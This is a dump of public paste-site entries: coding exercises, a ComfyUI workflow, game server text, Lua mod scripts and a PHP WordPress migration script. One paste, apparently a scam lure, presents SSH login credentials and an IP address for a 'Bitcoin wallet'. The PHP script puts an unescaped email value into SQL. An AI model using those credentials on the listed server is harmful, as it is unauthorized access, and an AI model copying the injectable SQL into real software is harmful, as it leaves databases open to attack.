id,title,username,language,date,content
gTTkzKdJ,Mpscow travel,fenixD3,C++,Sunday 19th of November 2023 11:47:47 AM CDT,"#include <iostream>
#include <cmath>
#include <iomanip>

double get_normalized_angle(double x, double y)
{
    auto angle = std::atan2(y, x);
    if (angle > std::numbers::pi)
    {
        angle -= 2 * std::numbers::pi;
    }
    else if (angle <= -std::numbers::pi)
    {
        angle += 2 * std::numbers::pi;
    }
    return angle;
}

double get_min_distance(double start_x, double start_y, double finish_x, double finish_y)
{
    auto radius_start = std::hypot(start_x, start_y);
    auto radius_finish = std::hypot(finish_x, finish_y);

    auto way_through_center = radius_start + radius_finish;

    auto angle_start = get_normalized_angle(start_x, start_y);
    auto angle_finish = get_normalized_angle(finish_x, finish_y);
    auto angle_between = std::abs(angle_start - angle_finish);

    auto arc_length = radius_start * angle_between;
    auto way_through_arc = arc_length + std::abs(radius_start - radius_finish);

    return std::isless(way_through_center, way_through_arc) ? way_through_center : way_through_arc;
}

int main()
{
    int start_x, start_y, finish_x, finish_y;
    std::cin >> start_x >> start_y >> finish_x >> finish_y;

    std::cout << std::fixed << std::setprecision(12) << get_min_distance(start_x, start_y, finish_x, finish_y) << std::endl;
}
"
MTBTWLgY,Untitled,pacho_the_python,Python,Sunday 19th of November 2023 11:28:34 AM CDT,"def create_force_side(side, member, user_info_dict):
    condition = [current_side for current_side in user_info_dict if member in user_info_dict[current_side]]

    if len(condition) == 0:
        condition.clear()
        if side not in user_info_dict:
            user_info_dict[side] = [member]
        else:
            user_info_dict[side].append(member)

    return user_info_dict


def create_force_user(member, side, user_info_dict):
    for current_side in user_info_dict:
        if member in user_info_dict[current_side]:
            if len(user_info_dict[current_side]) > 1:
                user_info_dict[current_side].pop(member)
                break
            else:
                del user_info_dict[current_side]
                break

    if side in user_info_dict:
        user_info_dict[side].append(member)
    else:
        user_info_dict[side] = [member]

    print(f""{member} joins the {side} side!"")


def force_book():
    user_info_dict = {}

    while True:
        command = input()

        if command == 'Lumpawaroo':
            break

        if '|' in command:
            command = command.split(' | ')
            side = command[0]
            member = command[1]
            create_force_side(side, member, user_info_dict)

        elif '->' in command:
            command = command.split(' -> ')
            member = command[0]
            side = command[1]
            create_force_user(member, side, user_info_dict)

    for data in user_info_dict:
        print(f'Side: {data}, Members: {len(user_info_dict[data])}')
        for name in user_info_dict[data]:
            print(f'! {name}')


force_book()
"
BRB1gCGY,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Sunday 19th of November 2023 11:24:06 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be: 
josli45:KoE3dG1 on 159.223.212.34
You can connect via SSH.

Regards
BT659752"
pspfvHrH,QRcd,Hristomir,Python,Sunday 19th of November 2023 11:04:21 AM CDT,"import pyqrcode
import png
from pyqrcode import QRCode

address = ""https://www.mobile.bg/pcgi/mobile.cgi?act=4&adv=21684763065393651&slink=u8qou0""

url = pyqrcode.create(address)
url.png(""accord.png"", scale=8)"
9Gr4vcFZ,MigrateBlogToWordPress Script,EurenikZ,PHP,Sunday 19th of November 2023 10:48:31 AM CDT,"﻿<?php

/*
1. ""wp_posts"" leeren
2. ""wp_term_relationships"" leeren
3. ""wp_comments"" leeren
4. ""wp_term_taxonomy"" importieren
5. ""wp_terms"" importieren
6. Script aufrufen
7. Blog aufrufen
*/

/*
EINSTELLUNGEN START
Tabellen und Spalten müssen im Script entsprechend angepasst werden.
*/

$domain = 'MeinBlog.tld';

// Verbindung zur alten Datenbank herstellen
$oldDb = new mysqli('localhost', 'BENUTZERNAME_HIER', 'PASSWORT_HIER', 'DATENBANK_HIER');

// Verbindung zur neuen Datenbank herstellen
$newDb = new mysqli('localhost', 'BENUTZERNAME_HIER', 'PASSWORT_HIER', 'DATENBANK_HIER');

/*
EINSTELLUNGEN ENDE
*/

// Überprüfen, ob die Verbindungen erfolgreich waren
if ($oldDb->connect_error || $newDb->connect_error) {
    die('Verbindungsfehler: ' . $oldDb->connect_error . ' | ' . $newDb->connect_error);
}

// SQL-Abfrage für den Datenbanktransfer
$query = ""SELECT * FROM tipps"";
$result = $oldDb->query($query);

// Überprüfen, ob die Abfrage erfolgreich war
if (!$result) {
    die('Abfragefehler: ' . $oldDb->error);
}

$i_blog = 0;
$i_comments = 0;

// Blog-Beiträge migrieren
while ($row = $result->fetch_assoc()) {
	$i_blog++;
    // Inhalte ersetzen und formatieren
    $postTitle = mysqli_real_escape_string($newDb, $row['titel']);
    $postContent = mysqli_real_escape_string($newDb, $row['inhalt']);
    $postDate = date('Y-m-d H:i:s', $row['datum']);
    $postModified = date('Y-m-d H:i:s', $row['lastedit']);
    $postAuthor = 1;

    // Weitere Inhalte generieren
    $postName = strtolower(str_replace(
        ['--', 'ß', 'ä', 'ü', 'ö', 'Ä', 'Ü', 'Ö'],
        ['-','ss','ae','ue','oe','ae','ue','oe'],
        preg_replace('/[^A-Za-z0-9\-]/', '', str_replace(
            ' ',
            '-',
            str_replace('&', 'und', str_replace(
                '&amp;',
                'and',
                str_replace(
                    ' / ',
                    '-',
                    str_replace(
                        '.',
                        '-',
                        str_replace(
                            ' – ',
                            '-',
                            str_replace(
                                ' - ',
                                '-',
                                str_replace(
                                    '+',
                                    'plus',
                                    $postTitle
                                )
                            )
                        )
                    )
                )
            )
        ))
    )));

    $guid = 'https://'.strtolower($domain).'/?p=' . $row['id'];

    // SQL-Abfrage für den Datenbankeinfügung in die neue Tabelle wp_posts
    $insertQuery = ""INSERT INTO wp_posts (ID, post_author, post_date, post_date_gmt, post_content, post_title, post_excerpt, post_status, comment_status, ping_status, post_password, post_name, to_ping, pinged, post_modified, post_modified_gmt, post_content_filtered, post_parent, guid, menu_order, post_type, post_mime_type, comment_count)
                    VALUES (NULL, $postAuthor, '$postDate', '$postDate', '$postContent', '$postTitle', '', 'publish', 'open', 'open', '', '$postName', '', '', '$postModified', '$postModified', '', 0, '$guid', 0, 'post', '', 0)"";

    // Überprüfen, ob die Abfrage erfolgreich war
    if (!$newDb->query($insertQuery)) {
        die('Fehler beim Einfügen: ' . $newDb->error);
    }

    // Kategorie-ID aus der alten Tabelle ""tipps""
    $alteKategorieId = $row['kategorie_id'];

    // Neue Kategorie-ID in ""wp_terms"" um 1 erhöhen
    $neueKategorieId = $alteKategorieId + 1;

    // SQL-Abfrage für den Datenbankeinfügung in die neue Tabelle wp_term_relationships
    $insertTermRelationshipsQuery = ""INSERT INTO wp_term_relationships (object_id, term_taxonomy_id, term_order)
                                    VALUES (LAST_INSERT_ID(), $neueKategorieId, 0)"";

    // Überprüfen, ob die Abfrage erfolgreich war
    if (!$newDb->query($insertTermRelationshipsQuery)) {
        die('Fehler beim Einfügen in wp_term_relationships: ' . $newDb->error);
    }

    // SQL-Abfrage für die Aktualisierung der count-Spalte in wp_term_taxonomy
    $updateTermTaxonomyQuery = ""UPDATE wp_term_taxonomy SET count = count + 1 WHERE term_id = $neueKategorieId"";

    // Überprüfen, ob die Abfrage erfolgreich war
    if (!$newDb->query($updateTermTaxonomyQuery)) {
        die('Fehler beim Aktualisieren von wp_term_taxonomy: ' . $newDb->error);
    }
}

// Kommentare migrieren
// SQL-Abfrage für die Kommentare in comments
$commentsQuery = ""SELECT * FROM comments ORDER BY datum ASC"";
$commentsResult = $oldDb->query($commentsQuery);

// SQL-Abfrage für die Antworten in comments_answers
$answersQuery = ""SELECT * FROM comments_answers ORDER BY datum ASC"";
$answersResult = $oldDb->query($answersQuery);

// Antworten in ein Array umwandeln
$answersArray = array();
while ($answerRow = $answersResult->fetch_assoc()) {
    $answersArray[] = $answerRow;
}

// Schleife für Kommentare
while ($commentRow = $commentsResult->fetch_assoc()) {
	$i_comments++;
    // Inhalte formatieren
    $commentPostID = $commentRow['tipp_id'];
    $commentAuthor = mysqli_real_escape_string($newDb, $commentRow['name']);
    $commentDate = date('Y-m-d H:i:s', $commentRow['datum']);
    $commentContent = mysqli_real_escape_string($newDb, $commentRow['kommentar']);
    $commentEmail = $commentRow['email'];

    // SQL-Abfrage für den Datenbankeinfügung in die neue Tabelle wp_comments
    $insertCommentQuery = ""INSERT INTO wp_comments (comment_post_ID, comment_author, comment_date, comment_date_gmt, comment_content, comment_author_email, comment_approved, comment_type, comment_parent, user_id)
                           VALUES ($commentPostID, '$commentAuthor', '$commentDate', '$commentDate', '$commentContent', '$commentEmail', 1, 'comment', 0, $user_id)"";

    // Überprüfen, ob die Abfrage erfolgreich war
    if (!$newDb->query($insertCommentQuery)) {
        die('Fehler beim Einfügen von Kommentaren: ' . $newDb->error);
    }

    // Schleife für Antworten
    foreach ($answersArray as $answerRow) {
        // Wenn die Antwort zur aktuellen Kommentar-ID gehört
        if ($answerRow['comment_id'] == $commentRow['id']) {
            // Inhalte formatieren
            $answerPostID = $answerRow['tipp_id'];
            $answerAuthor = mysqli_real_escape_string($newDb, $answerRow['name']);
            $answerDate = date('Y-m-d H:i:s', $answerRow['datum']);
            $answerContent = mysqli_real_escape_string($newDb, $answerRow['antwort']);
            $answerEmail = $answerRow['email'];

            // SQL-Abfrage für den Datenbankeinfügung in die neue Tabelle wp_comments für Antworten
            $insertAnswerQuery = ""INSERT INTO wp_comments (comment_post_ID, comment_author, comment_date, comment_date_gmt, comment_content, comment_author_email, comment_approved, comment_type, comment_parent, user_id)
                                 VALUES ($answerPostID, '$answerAuthor', '$answerDate', '$answerDate', '$answerContent', '$answerEmail', 1, 'comment', LAST_INSERT_ID(), $user_id)"";

            // Überprüfen, ob die Abfrage erfolgreich war
            if (!$newDb->query($insertAnswerQuery)) {
                die('Fehler beim Einfügen von Antworten: ' . $newDb->error);
            }
        }
    }
}

// Verbindungen schließen
$oldDb->close();
$newDb->close();

echo 'Migration abgeschlossen! '.$i_blog.' Blog-Beiträge und '.$i_comments.' Kommentare wurden migriert.';
?>"
yx5i1waV,NP,VMaksimoski008,C++,Sunday 19th of November 2023 10:37:02 AM CDT,"#include <bits/stdc++.h>

#define pb push_back
#define eb emplace_back
#define sz(x) (int)x.size()
#define all(x) x.begin(), x.end()
#define uniq(x) x.erase(unique(all(x)), x.end())
#define rall(x) x.rbegin(), x.rend()
//#define int long long

using namespace std;

using ll = long long;
using ull = unsigned long long;
using ld = long double;
using pii = pair<int, int>;
using pll = pair<ll, ll>;

const int mod = 750083;
const int LOG = 20;
const int maxn = 1e5 + 5;
const double eps = 1e-9;

void setIO() {
    ios_base::sync_with_stdio(false);
    cin.tie(0);
    cout.tie(0);
}

int32_t main() {
    setIO();

    string a, b;
    cin >> a >> b;
   
    int n = sz(a), m = sz(b);
    int dp_min[n+1][m+1], dp[n+1][m+1];
    bool used[n+1][m+1];
    memset(dp, 0, sizeof(dp));
    memset(used, 0, sizeof(used));
    dp_min[0][0] = 0;
    used[0][0] = 1, used[n][m] = 1;

    for(int i=0; i<=n; i++) { 
        for (int j=0; j<=m; j++) {  
            if(!i) dp_min[i][j] = j; 
            else if(!j) dp_min[i][j] = i; 
            else if (a[i-1] == b[j-1]) dp_min[i][j] = 1 + dp_min[i-1][j-1]; 
            else dp_min[i][j] = 1 + min(dp_min[i-1][j], dp_min[i][j-1]); 
        } 
    } 

    queue<pii> q;
    q.push({ n, m });
    while(!q.empty()) {
        int i = q.front().first;
        int j = q.front().second;
        q.pop();

        if(a[i-1] == b[j-1]) {
            if(dp_min[i-1][j-1] + 1 == dp_min[i][j] && !used[i-1][j-1]) {
                q.push({ i-1, j-1 });
                used[i-1][j-1] = 1;
            }
        } else {
            if(dp_min[i-1][j] + 1 == dp_min[i][j] && !used[i-1][j]) {
                q.push({ i-1, j });
                used[i-1][j] = 1;
            }
            if(dp_min[i][j-1] + 1 == dp_min[i][j] && !used[i][j-1]) {
                q.push({ i, j-1 });
                used[i][j-1] = 1;
            }
        }
    }

    for(int i=0; i<=n; i++) {
        for(int j=0; j<=m; j++) cout << used[i][j];
        cout << '\n';
    }

    dp[0][0] = 1;
    for(int i=0; i<=n; i++) {
        for(int j=0; j<=m; j++) {
            if(!used[i][j]) continue;
            if(!i && !j) continue;

            if(!i && used[i][j-1]) {
                dp[i][j] += dp[i][j-1];
                dp[i][j] %= mod;
            }

            if(!j && used[i-1][j]) {
                dp[i][j] += dp[i-1][j];
                dp[i][j] %= mod;
            }

            if(!i || !j) continue;

            if(a[i-1] == b[j-1] && used[i-1][j-1]) {
                dp[i][j] += dp[i-1][j-1];
                dp[i][j] %= mod;
            } else {
                if(used[i-1][j]) {
                    dp[i][j] += dp[i-1][j];
                    dp[i][j] %= mod;
                }

                if(used[i][j-1]) {
                    dp[i][j] += dp[i][j-1];
                    dp[i][j] %= mod;
                }
            }
        }
    }

    cout << dp[n][m] << '\n';
    return 0;
}"
7uAVYB7J,ComfyUI workflow for using OpenPose,Satscape,JSON,Sunday 19th of November 2023 10:22:55 AM CDT,"{
  ""last_node_id"": 62,
  ""last_link_id"": 140,
  ""nodes"": [
    {
      ""id"": 34,
      ""type"": ""ControlNetLoader"",
      ""pos"": [
        290,
        -420
      ],
      ""size"": {
        ""0"": 457.5661315917969,
        ""1"": 58
      },
      ""flags"": {},
      ""order"": 0,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""CONTROL_NET"",
          ""type"": ""CONTROL_NET"",
          ""links"": [
            60
          ],
          ""shape"": 3
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""ControlNetLoader""
      },
      ""widgets_values"": [
        ""control_v11p_sd15_openpose_fp16.safetensors""
      ]
    },
    {
      ""id"": 55,
      ""type"": ""VAEDecode"",
      ""pos"": [
        1555.358897816051,
        191.0334347811612
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 46
      },
      ""flags"": {},
      ""order"": 11,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""samples"",
          ""type"": ""LATENT"",
          ""link"": 125
        },
        {
          ""name"": ""vae"",
          ""type"": ""VAE"",
          ""link"": 126
        }
      ],
      ""outputs"": [
        {
          ""name"": ""IMAGE"",
          ""type"": ""IMAGE"",
          ""links"": [
            140
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""VAEDecode""
      }
    },
    {
      ""id"": 52,
      ""type"": ""CLIPTextEncode"",
      ""pos"": [
        322,
        -100
      ],
      ""size"": {
        ""0"": 400,
        ""1"": 200
      },
      ""flags"": {},
      ""order"": 6,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 115
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            128
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""CLIPTextEncode""
      },
      ""widgets_values"": [
        ""A person""
      ],
      ""color"": ""#232"",
      ""bgcolor"": ""#353""
    },
    {
      ""id"": 53,
      ""type"": ""CLIPTextEncode"",
      ""pos"": [
        319,
        145
      ],
      ""size"": {
        ""0"": 400,
        ""1"": 200
      },
      ""flags"": {},
      ""order"": 7,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 119
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            117
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""CLIPTextEncode""
      },
      ""widgets_values"": [
        ""text""
      ],
      ""color"": ""#322"",
      ""bgcolor"": ""#533""
    },
    {
      ""id"": 51,
      ""type"": ""KSampler"",
      ""pos"": [
        1055,
        238
      ],
      ""size"": {
        ""0"": 437.8135070800781,
        ""1"": 671.9424438476562
      },
      ""flags"": {},
      ""order"": 10,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""model"",
          ""type"": ""MODEL"",
          ""link"": 114
        },
        {
          ""name"": ""positive"",
          ""type"": ""CONDITIONING"",
          ""link"": 130
        },
        {
          ""name"": ""negative"",
          ""type"": ""CONDITIONING"",
          ""link"": 117
        },
        {
          ""name"": ""latent_image"",
          ""type"": ""LATENT"",
          ""link"": 139,
          ""slot_index"": 3
        }
      ],
      ""outputs"": [
        {
          ""name"": ""LATENT"",
          ""type"": ""LATENT"",
          ""links"": [
            125
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""KSampler""
      },
      ""widgets_values"": [
        1347568955296,
        ""randomize"",
        35,
        7,
        ""euler"",
        ""normal"",
        1
      ],
      ""color"": ""#223"",
      ""bgcolor"": ""#335""
    },
    {
      ""id"": 50,
      ""type"": ""CheckpointLoaderSimple"",
      ""pos"": [
        -120,
        29
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 98
      },
      ""flags"": {},
      ""order"": 1,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""MODEL"",
          ""type"": ""MODEL"",
          ""links"": [
            114
          ],
          ""shape"": 3,
          ""slot_index"": 0
        },
        {
          ""name"": ""CLIP"",
          ""type"": ""CLIP"",
          ""links"": [
            115,
            119
          ],
          ""shape"": 3,
          ""slot_index"": 1
        },
        {
          ""name"": ""VAE"",
          ""type"": ""VAE"",
          ""links"": [
            121
          ],
          ""shape"": 3,
          ""slot_index"": 2
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""CheckpointLoaderSimple""
      },
      ""widgets_values"": [
        ""epicRealism_sd15.safetensors""
      ]
    },
    {
      ""id"": 32,
      ""type"": ""ControlNetApply"",
      ""pos"": [
        800,
        -270
      ],
      ""size"": {
        ""0"": 317.4000244140625,
        ""1"": 98
      },
      ""flags"": {},
      ""order"": 9,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""conditioning"",
          ""type"": ""CONDITIONING"",
          ""link"": 128
        },
        {
          ""name"": ""control_net"",
          ""type"": ""CONTROL_NET"",
          ""link"": 60,
          ""slot_index"": 1
        },
        {
          ""name"": ""image"",
          ""type"": ""IMAGE"",
          ""link"": 138
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            130
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""ControlNetApply""
      },
      ""widgets_values"": [
        1
      ]
    },
    {
      ""id"": 58,
      ""type"": ""EmptyLatentImage"",
      ""pos"": [
        515,
        409
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 106
      },
      ""flags"": {},
      ""order"": 2,
      ""mode"": 0,
      ""inputs"": [],
      ""outputs"": [
        {
          ""name"": ""LATENT"",
          ""type"": ""LATENT"",
          ""links"": [
            139
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""EmptyLatentImage""
      },
      ""widgets_values"": [
        512,
        512,
        1
      ]
    },
    {
      ""id"": 61,
      ""type"": ""Note"",
      ""pos"": [
        295,
        -521
      ],
      ""size"": [
        445.5208213771756,
        58.870972000683764
      ],
      ""flags"": {},
      ""order"": 3,
      ""mode"": 0,
      ""properties"": {
        ""text"": """"
      },
      ""widgets_values"": [
        ""You'll need the OpenPose controlnet selected here I use\n\""control_v11p_sd15_openpose_fp16.safetensors\""""
      ],
      ""color"": ""#432"",
      ""bgcolor"": ""#653""
    },
    {
      ""id"": 60,
      ""type"": ""LoadImage"",
      ""pos"": [
        -182,
        -351
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 102
      },
      ""flags"": {},
      ""order"": 4,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""IMAGE"",
          ""type"": ""IMAGE"",
          ""links"": [
            138
          ],
          ""shape"": 3,
          ""slot_index"": 0
        },
        {
          ""name"": ""MASK"",
          ""type"": ""MASK"",
          ""links"": null,
          ""shape"": 3
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""LoadImage""
      },
      ""widgets_values"": [
        null,
        ""image""
      ]
    },
    {
      ""id"": 62,
      ""type"": ""Note"",
      ""pos"": [
        -172,
        -461
      ],
      ""size"": [
        301.7019565734173,
        64.23535472660637
      ],
      ""flags"": {},
      ""order"": 5,
      ""mode"": 0,
      ""properties"": {
        ""text"": """"
      },
      ""widgets_values"": [
        ""Load your open pose image here""
      ],
      ""color"": ""#432"",
      ""bgcolor"": ""#653""
    },
    {
      ""id"": 20,
      ""type"": ""SaveImage"",
      ""pos"": [
        1818,
        198
      ],
      ""size"": {
        ""0"": 821.7040405273438,
        ""1"": 834.4818115234375
      },
      ""flags"": {},
      ""order"": 12,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""images"",
          ""type"": ""IMAGE"",
          ""link"": 140,
          ""slot_index"": 0
        }
      ],
      ""properties"": {},
      ""widgets_values"": [
        ""OpenPose""
      ]
    },
    {
      ""id"": 54,
      ""type"": ""Reroute"",
      ""pos"": [
        1125,
        53
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 8,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 121
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""VAE"",
          ""links"": [
            126
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": false
      }
    }
  ],
  ""links"": [
    [
      60,
      34,
      0,
      32,
      1,
      ""CONTROL_NET""
    ],
    [
      114,
      50,
      0,
      51,
      0,
      ""MODEL""
    ],
    [
      115,
      50,
      1,
      52,
      0,
      ""CLIP""
    ],
    [
      117,
      53,
      0,
      51,
      2,
      ""CONDITIONING""
    ],
    [
      119,
      50,
      1,
      53,
      0,
      ""CLIP""
    ],
    [
      121,
      50,
      2,
      54,
      0,
      ""*""
    ],
    [
      125,
      51,
      0,
      55,
      0,
      ""LATENT""
    ],
    [
      126,
      54,
      0,
      55,
      1,
      ""VAE""
    ],
    [
      128,
      52,
      0,
      32,
      0,
      ""CONDITIONING""
    ],
    [
      130,
      32,
      0,
      51,
      1,
      ""CONDITIONING""
    ],
    [
      138,
      60,
      0,
      32,
      2,
      ""IMAGE""
    ],
    [
      139,
      58,
      0,
      51,
      3,
      ""LATENT""
    ],
    [
      140,
      55,
      0,
      20,
      0,
      ""IMAGE""
    ]
  ],
  ""groups"": [],
  ""config"": {},
  ""extra"": {},
  ""version"": 0.4
}"
PFDXEB7M,Azarus SCP:SL HRP #0,Bonjemus_YT,CSS,Sunday 19th of November 2023 09:59:21 AM CDT,"<align=center><size=35><b><color=#5534be>Bienvenue sur Azarus</color></b></size></align>
 
<color=#8f75e0>Des rôles, des objets et mêmes des SCP supplémentaires vous attendent !</color>

<size=17><color=#cc1f1f><b>3 règles simples à connaître :</color></b>
1. les insultes sont interdites.
2. La tricherie/utilisation d'exploit est interdite.
3. Les soundboards à caractère déplacées sont proscrites.
 
Pour nous rejoindre :</size>
<size=25>
> <link=""https://discord.gg/2rffSApHdD""><color=#795cd4><u>Discord</u></color></link> <size=13>(cliquez dessus)</size>
 
> <link=""https://www.patreon.com/FondationAzarus""><color=#fff984><u>Patreon</u></color></link></size> <size=13>(cliquez dessus)</size>
</size>
 
<color=#fff9ac>Pour en apprendre plus sur nos fonctionnalités uniques n’hésitez pas à poser vos questions sur le Discord ou directement en jeu (lorsque vous êtes spectateur par exemple).</color>
 
 
<b>Pour nous contacter :</b> <color=#795cd4>azarusscpsl@gmail.com</color>
<i>Ou passez par Discord : les MP des Fondateurs sont toujours ouverts.</i>"
Nz3UBth9,mekanismEnergyStorage,DafTag,Lua,Sunday 19th of November 2023 09:29:46 AM CDT,"local component = require(""component"")
local sides = require(""sides"")

-- Remplacez ces coordonnées par celles de votre bloc de stockage Mekanism
local mekanismStorage = component.proxy(component.list(""mekanism:creative_bin"")[1])

-- Fonction pour récupérer les informations du système de stockage Mekanism
function getMekanismStorageInfo()
    local info = {}

    -- Récupérer la capacité totale du stockage
    info.totalCapacity = mekanismStorage.getStorageSize()

    -- Récupérer l'espace actuellement utilisé dans le stockage
    info.usedCapacity = mekanismStorage.getStorageSize() - mekanismStorage.getStorageSpace()

    -- Récupérer une liste des articles stockés avec leurs quantités
    info.itemList = mekanismStorage.listAvailableItems()

    return info
end

-- Fonction pour afficher les informations
function printStorageInfo(info)
    print(""Capacité totale du stockage: "" .. info.totalCapacity .. "" items"")
    print(""Espace utilisé: "" .. info.usedCapacity .. "" items"")
    
    print(""\nListe des articles stockés:"")
    for item, quantity in pairs(info.itemList) do
        print(item .. "": "" .. quantity)
    end
end

-- Exécution du programme
local storageInfo = getMekanismStorageInfo()
printStorageInfo(storageInfo)"
uVGYNpn1,Untitled,Creadth,Lua,Sunday 19th of November 2023 09:23:00 AM CDT,"function redstonePulse(side)
    local status = redstone.getOutput(side);
    redstone.setOutput(side, not status);
	os.sleep(0.05);
    redstone.setOutput(side, status);
end

local readyChestSide = ""top"";
local beltInvertorSide = ""back"";
local seedInputSide = ""bottom"";

local grownCrystalName = ""appliedenergistics2:purified_certus_quartz_crystal"";

--local monitor = peripheral.wrap('right');
local belt = peripheral.wrap('right');
local items
--monitor.setCursorPos(1,1);
--monitor.setTextScale(0.5);
redstone.setOutput(beltInvertorSide, false)
--monitor.write('Detecting...');
redstone.setOutput(readyChestSide, true);
redstone.setOutput(seedInputSide, true);
local ticksWithoutItem = 0;
print('Detecting')
while true do
    items = belt.list();
    if #items > 0 then
        ticksWithoutItem = 0;
        --monitor.clear();
        local item = belt.getItemDetail(1);
        if (item.name ~= grownCrystalName) then
            print(""Crystal is not ready, another iteration"");
            redstone.setOutput(beltInvertorSide, true);
            os.sleep(4);
            redstone.setOutput(beltInvertorSide, false)
        else
            print(""Crystal is ready!"");
            redstonePulse(readyChestSide);
            redstonePulse(seedInputSide);
        end
    else
        ticksWithoutItem=ticksWithoutItem+1;
        if (ticksWithoutItem > 600) then
            print(""No items detected on the belt for 600 ticks, requesting another item"");
            redstonePulse(seedInputSide);
            ticksWithoutItem = 0;
        end
    end
    os.sleep(0.1);
end"
